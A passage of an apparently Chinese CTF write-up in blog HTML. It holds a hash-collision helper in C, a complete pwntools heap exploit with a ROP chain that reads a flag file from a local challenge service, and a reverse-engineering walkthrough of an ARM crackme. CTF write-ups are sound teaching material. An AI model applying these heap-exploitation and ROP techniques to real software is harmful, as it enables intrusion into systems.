class="number">0</span>;</span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                    a[i+len]=<span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          len=len*<span class="number">2</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="keyword">if</span>(a[i]==<span class="number">1</span>)</span><br><span class="line">               s[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">               s[i] = <span class="string">&#x27;b&#x27;</span>; </span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Len; ++i)</span><br><span class="line">          Ans0 = Ans0 * <span class="number">37</span> + s[i]; </span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">100000</span> - Len; ++i)</span><br><span class="line">          <span class="keyword">if</span> (Cmp(i)) &#123;</span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; Len; ++j)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s[j]);</span><br><span class="line">               <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; Len; ++j)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s[i + j]);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./manager&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,ids,length,info</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input Name of Staff:\n&#x27;</span>)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input Number of Staff:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ids))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input len of Info:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;get Info:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(length &gt; <span class="number">0</span>):</span><br><span class="line">        sh.send(info)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span>(<span class="params">ids,name</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input Number:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ids))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input name:\n&#x27;</span>)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span>(<span class="params">ids,length,info</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input Number:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ids))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input len of Info:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input info:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(length &gt; <span class="number">0</span>):</span><br><span class="line">        sh.send(info)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">ids</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input Number:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ids))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">ids</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input Number of Staff:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ids))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">ids</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Input staff number:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(ids))</span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;&gt;&gt;&gt;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login</span>():</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;./password.out&#x27;</span>)</span><br><span class="line">    s1 = f.readline()[:-<span class="number">1</span>]</span><br><span class="line">    s2 = f.readline()</span><br><span class="line">    f.close()</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Input String1:&#x27;</span>, s1)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Input String2:&#x27;</span>, s2)</span><br><span class="line"></span><br><span class="line">Login()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">2</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Info:&#x27;</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3C4B0A</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">add(<span class="string">&#x27;c&#x27;</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;d&#x27;</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit_info(<span class="number">3</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit_info(<span class="number">4</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit_info(<span class="number">3</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Info:&#x27;</span>)</span><br><span class="line">heap_base = (u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base = &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">edit_info(<span class="number">4</span>,<span class="number">0x10</span>,p64(<span class="number">0x170</span> + heap_base))</span><br><span class="line">add(<span class="string">&#x27;d&#x27;</span>,<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">environ_addr = libc_base + <span class="number">0x3c6f38</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(environ_addr) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="number">2</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Info:&#x27;</span>)</span><br><span class="line">environ = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;environ = &quot;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">log.info(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heap_base + <span class="number">0xb0</span>) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="number">2</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">rdi_ret = <span class="number">0x0000000000021112</span> + libc_base </span><br><span class="line">rsi_ret = <span class="number">0x00000000000202f8</span> + libc_base</span><br><span class="line">rdx_ret = <span class="number">0x0000000000001b92</span> + libc_base</span><br><span class="line">buf_addr = heap_base + <span class="number">0x2000</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x0000000000042361</span></span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag = heap_base + <span class="number">0x130</span></span><br><span class="line">rop = p64(rdi_ret) + p64(flag) + p64(rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">rop += p64(rdi_ret) + p64(<span class="number">3</span>) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_ret) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">rop += p64(rdi_ret) + p64(<span class="number">1</span>) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_ret) + p64(<span class="number">0x30</span>) + p64(write_addr)</span><br><span class="line">edit_info(<span class="number">9</span>,<span class="number">0xa0</span>,rop)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heap_base + <span class="number">0x270</span>) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">rbp = environ - <span class="number">0x128</span></span><br><span class="line">rop_addr = heap_base + <span class="number">0x380</span></span><br><span class="line">edit_info(<span class="number">2</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">edit_info(<span class="number">9</span>,<span class="number">0x10</span>,p64(rbp) + p64(<span class="number">9</span>))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">edit_name(<span class="number">9</span>,p64(rop_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="easy-rev"><a href="#easy-rev" class="headerlink" title="easy_rev"></a>easy_rev</h3><p>简单的逆向，程序一开始玩了一点点小花招，再<code>init_array</code>将全局数组的内容改了。并且使用了arm中常见的anti-ida的技巧，混入了几个有问题的字节。<strong>这里并不是塞得无意义字节啦，本意首先塞入一个叫做PLD的加速指令。</strong><br><img src="/2020/11/24/2020-Taihuctf-writeup/PLD.png"><br>这个指令中提到，如果发生了异常，系统会将这个指令当成NOP处理。而出题使用的字节码为<code>0xF5DFDF02</code>，翻译成二进制即为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">11110101110111111 1011 11100000010</span><br><span class="line">                   ^</span><br><span class="line">                   |</span><br><span class="line">               注意这一段</span><br></pre></td></tr></table></figure>
<p>而这个指令在手册中的定义如下。。。<br><img src="/2020/11/24/2020-Taihuctf-writeup/PLD2.png"><br>我们把arm指令本身给破坏了，所以导致ida翻译失败，可能这也是导致qemu模拟的arm环境运行不起来，这个出题人才疏学浅，确实没有意识到这个问题 <em>出题人在树莓派上测试是可以执行的（包括使用gdb），所以没有意识到这个问题。。。</em></p>
<p>这边只需要将这些全部nop即可:<br>处理之前</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">text:00010940 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00010940</span><br><span class="line">.text:00010940 loc_10940                               ; DATA XREF: start+20↑o</span><br><span class="line">.text:00010940                                         ; .text:main↑o</span><br><span class="line">.text:00010940                 STMFD   SP!, &#123;R4,R11,LR&#125;</span><br><span class="line">.text:00010944                 ADD     R11, SP, #8</span><br><span class="line">.text:00010948                 SUB     SP, SP, #0x84</span><br><span class="line">.text:00010948 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0001094C                 DCD 0xF5DFDF02, 0xE1A00000, 0xE1A00000, 0xE1A00000, 0xE1A00000</span><br><span class="line">.text:0001094C                 DCD 0xE1A00000, 0xE1A00000, 0xE1A00000, 0xE24B305C, 0xE3A02000</span><br><span class="line">.text:0001094C                 DCD 0xE5832000, 0xE5832004, 0xE5832008, 0xE583200C, 0xE5832010</span><br><span class="line">.text:0001094C                 DCD 0xE5832014, 0xE5832017, 0xE3A03000, 0xE50B3020, 0xE3A01000</span><br><span class="line">.text:0001094C                 DCD 0xE59F02E4, 0xEBFFFE8D, 0xE50B0024, 0xE3A03000, 0xE58D3004</span><br></pre></td></tr></table></figure>
<p>处理之后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:00010940 fd              &#x3D; -0x8C</span><br><span class="line">.text:00010940 offset          &#x3D; -0x88</span><br><span class="line">.text:00010940 var_80          &#x3D; -0x80</span><br><span class="line">.text:00010940 var_78          &#x3D; -0x78</span><br><span class="line">.text:00010940 var_68          &#x3D; -0x68</span><br><span class="line">.text:00010940 var_64          &#x3D; -0x64</span><br><span class="line">.text:00010940 var_60          &#x3D; -0x60</span><br><span class="line">.text:00010940 var_5C          &#x3D; -0x5C</span><br><span class="line">.text:00010940 var_40          &#x3D; -0x40</span><br><span class="line">.text:00010940 var_3C          &#x3D; -0x3C</span><br><span class="line">.text:00010940 var_38          &#x3D; -0x38</span><br><span class="line">.text:00010940 var_34          &#x3D; -0x34</span><br><span class="line">.text:00010940 var_30          &#x3D; -0x30</span><br><span class="line">.text:00010940 var_2C          &#x3D; -0x2C</span><br><span class="line">.text:00010940 var_28          &#x3D; -0x28</span><br><span class="line">.text:00010940 var_24          &#x3D; -0x24</span><br><span class="line">.text:00010940 dest            &#x3D; -0x20</span><br><span class="line">.text:00010940 var_1C          &#x3D; -0x1C</span><br><span class="line">.text:00010940 var_18          &#x3D; -0x18</span><br><span class="line">.text:00010940 var_14          &#x3D; -0x14</span><br><span class="line">.text:00010940 var_10          &#x3D; -0x10</span><br><span class="line">.text:00010940 var_C           &#x3D; -0xC</span><br><span class="line">.text:00010940</span><br><span class="line">.text:00010940                 STMFD   SP!, &#123;R4,R11,LR&#125;</span><br><span class="line">.text:00010944                 ADD     R11, SP, #8</span><br><span class="line">.text:00010948                 SUB     SP, SP, #0x84</span><br><span class="line">.text:0001094C                 NOP</span><br><span class="line">.text:00010950                 NOP</span><br><span class="line">.text:00010954                 NOP</span><br><span class="line">.text:00010958                 NOP</span><br><span class="line">.text:0001095C                 NOP</span><br><span class="line">.text:00010960                 NOP</span><br><span class="line">.text:00010964                 NOP</span><br><span class="line">.text:00010968                 NOP</span><br><span class="line">.text:0001096C                 SUB     R3, R11, #-var_5C</span><br><span class="line">.text:00010970                 MOV     R2, #0</span><br><span class="line">.text:00010974                 STR     R2, [R3]</span><br></pre></td></tr></table></figure>

<p>输入的字符的前13首先会进行一轮检测</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">12</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = *(<span class="keyword">int</span> (__fastcall **)(_DWORD, _DWORD))&amp;v33[<span class="number">4</span> * (k % <span class="number">3</span>) - <span class="number">92</span>];</span><br><span class="line">    v1 = *((<span class="keyword">unsigned</span> __int8 *)&amp;v7 + k);</span><br><span class="line">    <span class="keyword">if</span> ( v1 != v21(*((<span class="keyword">unsigned</span> __int8 *)&amp;v14 + k), byte_2103C[k]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Operation failed!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check next section&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这里会轮流call三个轮转函数，并且将全局变量<code>byte_2103C</code>传入。动态调试之后会发现，其实这三个函数分别是add/sub/xor，所以只需要逆向写这三个逻辑即可:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a+b)%<span class="number">256</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a-b+<span class="number">256</span>)%<span class="number">256</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a^b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_first</span>():</span></span><br><span class="line">    f_ops =[<span class="number">253</span>, <span class="number">154</span>, <span class="number">159</span>, <span class="number">232</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">155</span>, <span class="number">45</span>, <span class="number">195</span>, <span class="number">17</span>, <span class="number">42</span>, <span class="number">53</span>, <span class="number">246</span> ]</span><br><span class="line">    first = [ <span class="number">99</span>,<span class="number">210</span>,<span class="number">254</span>,<span class="number">79</span>,<span class="number">185</span>,<span class="number">217</span>,<span class="number">0</span>,<span class="number">63</span>,<span class="number">160</span>,<span class="number">128</span>,<span class="number">67</span>,<span class="number">80</span>,<span class="number">85</span>]</span><br><span class="line">    func = [sub,add,xor]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(first)):</span><br><span class="line">        print(<span class="built_in">chr</span>(func[i%<span class="number">3</span>](first[i],f_ops[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_first()</span><br><span class="line"><span class="comment"># flag&#123;welcome_</span></span><br></pre></td></tr></table></figure>

<p>后面的逻辑和前面的类似，会运行一段类似解密逻辑，解开了发现是一个迷宫:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">******</span><br><span class="line">*   E*</span><br><span class="line">* ****</span><br><span class="line">* ****</span><br><span class="line">* ****</span><br><span class="line">*    *</span><br></pre></td></tr></table></figure>
<p>这里出题有点失误。。。没有把所有的路径都解开，但是如果能解开的话完整逻辑为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">******</span><br><span class="line">*   E*</span><br><span class="line">* ****</span><br><span class="line">* ****</span><br><span class="line">* ****</span><br><span class="line">*    *</span><br><span class="line">**** *</span><br><span class="line">**** *</span><br><span class="line">****D*</span><br><span class="line">******</span><br></pre></td></tr></table></figure>
<p>然后从E点走到D点。然后发现题目会根据输入的路径异或解开flag，于是最后得到:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a+b)%<span class="number">256</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a-b+<span class="number">256</span>)%<span class="number">256</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a^b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_first</span>():</span></span><br><span class="line">    f_ops =[<span class="number">253</span>, <span class="number">154</span>, <span class="number">159</span>, <span class="number">232</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">155</span>, <span class="number">45</span>, <span class="number">195</span>, <span class="number">17</span>, <span class="number">42</span>, <span class="number">53</span>, <span class="number">246</span> ]</span><br><span class="line">    first = [ <span class="number">99</span>,<span class="number">210</span>,<span class="number">254</span>,<span class="number">79</span>,<span class="number">185</span>,<span class="number">217</span>,<span class="number">0</span>,<span class="number">63</span>,<span class="number">160</span>,<span class="number">128</span>,<span class="number">67</span>,<span class="number">80</span>,<span class="number">85</span>]</span><br><span class="line">    func = [sub,add,xor]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(first)):</span><br><span class="line">        print(<span class="built_in">chr</span>(func[i%<span class="number">3</span>](first[i],f_ops[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_second</span>():</span></span><br><span class="line">    s_ops = [ <span class="number">83</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">30</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">11</span>,<span class="number">54</span>,<span class="number">40</span>,<span class="number">55</span>,<span class="number">82</span>,<span class="number">14</span>]</span><br><span class="line">    op = <span class="string">&quot;aaassssdddsss&quot;</span></span><br><span class="line">    <span 